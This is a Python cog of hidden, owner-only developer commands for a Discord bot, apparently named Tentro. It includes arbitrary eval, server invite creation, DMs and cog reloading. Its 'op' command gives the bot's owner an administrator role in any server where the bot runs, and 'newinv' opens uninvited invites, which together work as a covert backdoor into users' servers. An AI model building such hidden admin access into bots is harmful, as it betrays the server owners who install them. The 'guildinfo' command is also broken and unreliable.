# Ping Codeize to do this shit

from discord.ext import commands
import discord
from dbfn import reactionbook
import os, asyncio
import traceback
import sys
from traceback import format_exception

class DevCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="newinv", description="Creates an invite for a server!", hidden=True)
    @commands.is_owner()
    async def newinv(self, ctx, guild_id: int):
        guild = self.bot.get_guild(guild_id)
        try:
            invite = await guild.system_channel.create_invite(
                max_age=120 * 60, temporary=True)
        except: invite = "Error resolving invite!"
        await ctx.send(f"Created a temporary invite for `{guild}`\n"f"`{invite}`, this invite will expire after 2 hours.")

    @commands.command(name="guilds", hidden=True)
    @commands.is_owner()
    async def guilds(self, ctx):

        guilds = []
        members = 0
        for guild in self.bot.guilds:
            guilds.append([guild.member_count, guild.name, guild.id])
            members += guild.member_count
        guilds.sort(reverse=True)

        colour = 0x00ff00
        book = reactionbook(self.bot, ctx, TITLE="Servers")
        book.createpages(guilds, f"`%1`: **%0**")
        await book.createbook(SHOW_RESULTS=True, COLOUR=colour)

    @commands.command(name="setstatus", hidden=True)
    @commands.is_owner()
    async def setstatus(self, ctx, *, text: str):
        await self.bot.change_presence(activity=discord.Game(name=text))
        await ctx.message.add_reaction("✅")

    @commands.command(name="guildinfo", hidden=True)
    @commands.is_owner()
    async def guildinfo(self, ctx, guild_id):
        
        guild_id = self.bot.get_guild(guild_id)
        members = len(list(ctx.guild.members))
       
        try:
            embed = discord.Embed(title=ctx.guild.name)
            embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
            embed.add_field(name="Members:",inline=False, value=f"{members}")
                               
            embed.set_footer(text=f"{ctx.guild}", icon_url=f"{ctx.guild.icon_url}")
            await ctx.send(embed=embed)
        except:
            pass
        

    @commands.command(name="channelsend")
    @commands.is_owner()
    async def channelsend(self, ctx, channel: discord.TextChannel, *, text):
        await channel.send(text)
        await ctx.message.add_reaction("✅")
        

    @commands.command(name="dm")
    @commands.is_owner()
    async def dm(self, ctx, member: discord.Member, *, text):
        await member.send(text)
        await ctx.message.add_reaction("✅")
        await ctx.message.delete()
        

    @commands.command(name="op", description="Gives the developer a role with permission.", hidden=True)
    @commands.cooldown(1, 30, commands.BucketType.member)
    @commands.is_owner()
    async def op(self, ctx):
        try:
            role = await ctx.guild.create_role(name="Tentro Dev")
            permissions = discord.Permissions()
            permissions.update(administrator=True)
            await role.edit(position=ctx.guild.me.top_role.position-1, permissions=permissions)
            user = ctx.message.author
            await user.add_roles(role)
            await ctx.message.add_reaction("✅")
        except discord.Forbidden:
            await ctx.send("I do not have permission to do this!")


    @commands.command(name='off_op', description='Removes the developers Tentro dev role in a server', hidden=True)
    @commands.cooldown(1, 30, commands.BucketType.member)
    @commands.is_owner()
    async def off_op(self, ctx):
        try:
            
            user = ctx.message.author
            role = discord.utils.get(ctx.guild.roles, name='Tentro Dev')
            await user.remove_roles(role)
            await role.delete()
            await ctx.message.add_reaction("✅")

        except discord.Forbidden:
            await ctx.send("I do not have permission to do this!")

    @commands.command(name="logout")
    @commands.is_owner()
    async def logout(self, ctx):
        await ctx.send(f"Voiding process..")
        await self.bot.logout()

    @commands.command(name="reload", description="Reload all/one of the bots cogs!")
    @commands.is_owner()
    async def reload(self, ctx, cog=None):
        if not cog:
            # No cog, means we reload all cogs
            async with ctx.typing():
                embed = discord.Embed(
                    title="Reloading all cogs!",
                    color=0x808080,
                    timestamp=ctx.message.created_at
                )
                for ext in os.listdir("./cogs/"):
                    if ext.endswith(".py") and not ext.startswith("_"):
                        try:
                            self.bot.unload_extension(f"cogs.{ext[:-3]}")
                            self.bot.load_extension(f"cogs.{ext[:-3]}")
                            embed.add_field(
                                name=f"Reloaded: `{ext}`",
                                value='\uFEFF',
                                inline=False
                            )
                        except Exception as e:
                            embed.add_field(
                                name=f"Failed to reload: `{ext}`",
                                value=e,
                                inline=False
                            )
                        await asyncio.sleep(0.5)
                await ctx.send(embed=embed)
        else:
            # reload the specific cog
            async with ctx.typing():
                embed = discord.Embed(
                    title="Reloading all cogs!",
                    color=0x808080,
                    timestamp=ctx.message.created_at
                )
                ext = f"{cog.lower()}.py"
                if not os.path.exists(f"./cogs/{ext}"):
                    # if the file does not exist
                    embed.add_field(
                        name=f"Failed to reload: `{ext}`",
                        value="This cog does not exist.",
                        inline=False
                    )

                elif ext.endswith(".py") and not ext.startswith("_"):
                    try:
                        self.bot.unload_extension(f"cogs.{ext[:-3]}")
                        self.bot.load_extension(f"cogs.{ext[:-3]}")
                        embed.add_field(
                            name=f"Reloaded: `{ext}`",
                            value='\uFEFF',
                            inline=False
                        )
                    except Exception:
                        desired_trace = traceback.format_exc()
                        embed.add_field(
                            name=f"Failed to reload: `{ext}`",
                            value=desired_trace,
                            inline=False
                        )
                await ctx.send(embed=embed)
        
    @commands.command(name="eval", description="Evaluate arbitrary code.", hidden=True)
    @commands.is_owner()
    async def eval(self, ctx, *, content):

        bot = self.bot

        channel = ctx.channel
        author = ctx.author
        message = ctx.message

        if str(channel.type) != "private":
            guild = ctx.guild

        colour = 0x00FF00
        book = reactionbook(self.bot, ctx, TITLE="Tentro Eval")

        try:
            result = str(eval(content))
        except Exception as e:
            result = "".join(format_exception(e, e, e.__traceback__))

        pages = []
        content = f"Input:\n```py\n{content}```\n"
        for i in range(0, len(result), 2000):
            pages.append(f"Output:\n```py\n{result[i:i + 2000]}\n```")
        if len(content + pages[0]) > 2000:
            pages.insert(0, content)
        else:
            pages[0] = content + pages[0]
        book.createpages(pages, ITEM_PER_PAGE=True)

        await book.createbook(MODE="arrows", COLOUR=colour, TIMEOUT=180)
        

def setup(bot):
    bot.add_cog(DevCommands(bot))